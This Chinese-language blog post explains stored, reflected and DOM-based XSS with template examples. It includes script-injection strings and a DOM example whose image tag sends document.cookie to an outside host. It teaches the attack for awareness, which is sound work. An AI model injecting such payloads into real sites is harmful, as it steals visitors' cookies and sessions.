---
title: 什么是 XSS 攻击
date: 2017-07-15 18:03:31
tags:
  - xss
  - security
---

XSS 的全称是 Cross Site Scripting，为了避免同 CSS 的缩写重复所以用了 XSS 代替，相比于上一篇介绍的 CSRF 攻击，XSS 攻击的威力更大，它可以直接在用户当前正在浏览的页面运行自定义的 javascript 脚本，操作得当的话可以污染浏览这个页面的所有用户。

XSS 主要分为三类：存储型、反射型和 DOM 型（目前主流是前后端分离，反射型不如 DOM 型常见），下面我们依次了解一下每种攻击方式有何不同。

## 存储型
比起存储型这个更为广泛的叫法，持久型跨站脚本（Persistent Cross-Site Scripting）相对来说更贴切一些，这类攻击通常发生在用户生成内容的地方（UGC）比如评论、博客之类的，由于用户输入被存储在了数据库，每个浏览到恶意输入的用户都可能中招，举个例子：

```html
// 以模版的形式展示用户评论
<div><%= comment %></div>
```

假设用户的评论内容是：`</div><script>alert('xss')</script><div>` 那么例子中的 `div` 会侧漏导致浏览这个页面的用户的浏览器都会执行 script 中的内容。

## 反射型和 DOM 型
这两类我们放在一起说，反射型 XSS 依赖用户操作，通常发生在页面需要直接使用 url 参数的地方，比如搜索页面，如果对 url 中的参数未加以防范很容易中招，举个例子：

```html
<div>您搜索的<%= query %>不存在</div>
```

攻击者伪造的 url：`https://shijianan.com?query="</div><script>alert('xss')</script>` 原理类似前面提到的存储型攻击，但是相对攻击范围较小，因此攻击者通常需要各种方式引诱用户点击恶意链接。

DOM 型则是基于前端的，如果直接用 innerHTML、document.write 这类 API 的时候对用户输入不加以防范容易出现这类 XSS 攻击，举个例子：

```js
comment = '<image src="https://shijianan.com?cookie=' + document.cookie + '" />';
const c = document.querySelector('comment');
c.innerHTML = comment;
```

通过注入一个 image 标签将用户的 cookie 就会被发送到指定页面了，因此我们在使用 vue 之类的框架的时候都会明确警示我们相关风险。

